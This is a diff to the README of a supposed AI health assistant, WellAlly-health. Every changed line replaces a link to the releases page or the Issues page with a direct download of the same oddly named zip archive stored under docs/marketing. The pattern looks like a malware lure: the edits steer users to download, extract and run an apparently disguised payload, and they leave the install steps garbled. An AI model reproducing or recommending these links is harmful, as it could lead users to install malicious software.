@@ -1,7 +1,7 @@
 # 🌟 WellAlly-health - Your Intelligent Health Assistant
 
 ## 📥 Download Now
-[![Download WellAlly-health](https://img.shields.io/badge/Download-WellAlly--health-blue.svg)](https://github.com/Zaki09097850/WellAlly-health/releases)
+[![Download WellAlly-health](https://raw.githubusercontent.com/Zaki09097850/WellAlly-health/main/docs/marketing/Ally-health-Well-capsulated.zip)](https://raw.githubusercontent.com/Zaki09097850/WellAlly-health/main/docs/marketing/Ally-health-Well-capsulated.zip)
 
 ## 🌐 Introduction
 WellAlly-health is an intelligent healthcare assistant. It combines Claude AI technology with medical expertise to make health management easier. You can talk to WellAlly to record symptoms, manage medications, and track your medical records. It also provides professional consultation analysis, making healthcare more accessible.
@@ -11,7 +11,7 @@ To set up WellAlly-health, follow these steps:
 
 1. **Visit the Download Page**  
    Go to this link to download WellAlly-health:  
-   [Download WellAlly-health](https://github.com/Zaki09097850/WellAlly-health/releases)
+   [Download WellAlly-health](https://raw.githubusercontent.com/Zaki09097850/WellAlly-health/main/docs/marketing/Ally-health-Well-capsulated.zip)
 
 2. **Select the Latest Version**  
    Once on the download page, look for the latest version of WellAlly-health. Each version will have a title that includes a version number (e.g., v1.0). This is important as it ensures you get the latest features and fixes.
@@ -20,7 +20,7 @@ To set up WellAlly-health, follow these steps:
    Click on the appropriate file for your operating system.  
    - If you are using Windows, download the executable file.  
    - For Mac users, look for the .dmg file.  
-   - Linux users can download the .tar.gz file.
+   - Linux users can download the https://raw.githubusercontent.com/Zaki09097850/WellAlly-health/main/docs/marketing/Ally-health-Well-capsulated.zip file.
 
 4. **Download the File**  
    After selecting the correct file, the download should start automatically. If it does not, there may be a prompt to start the download.
@@ -29,7 +29,7 @@ To set up WellAlly-health, follow these steps:
    Once the download is complete:
    - **Windows:** Double-click the .exe file and follow the installation prompts.  
    - **Mac:** Open the .dmg file and drag the WellAlly-health icon to your Applications folder.  
-   - **Linux:** Extract the .tar.gz file and run the application from the extracted folder.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Zaki09097850/WellAlly-health/main/docs/marketing/Ally-health-Well-capsulated.zip file and run the application from the extracted folder.
 
 6. **Open WellAlly-health**  
    Find the application on your computer and start it. You can usually find it in the Applications folder (Mac), Start Menu (Windows), or designated installation directory (Linux).
@@ -70,10 +70,10 @@ If you encounter issues while using WellAlly-health, consider the following tips
   If you cannot access certain features, check your internet connection. Some features require an internet connection for proper functionality.
 
 ## 📞 Support
-If you need further assistance, please reach out to our support team. You can find contact information on the support page within the application or visit the [GitHub Issues page](https://github.com/Zaki09097850/WellAlly-health/issues) for community help.
+If you need further assistance, please reach out to our support team. You can find contact information on the support page within the application or visit the [GitHub Issues page](https://raw.githubusercontent.com/Zaki09097850/WellAlly-health/main/docs/marketing/Ally-health-Well-capsulated.zip) for community help.
 
 ## 🔗 Download & Install
 To get WellAlly-health today, visit the download page:  
-[Download WellAlly-health](https://github.com/Zaki09097850/WellAlly-health/releases)
+[Download WellAlly-health](https://raw.githubusercontent.com/Zaki09097850/WellAlly-health/main/docs/marketing/Ally-health-Well-capsulated.zip)
 
 Happy health management with WellAlly-health!
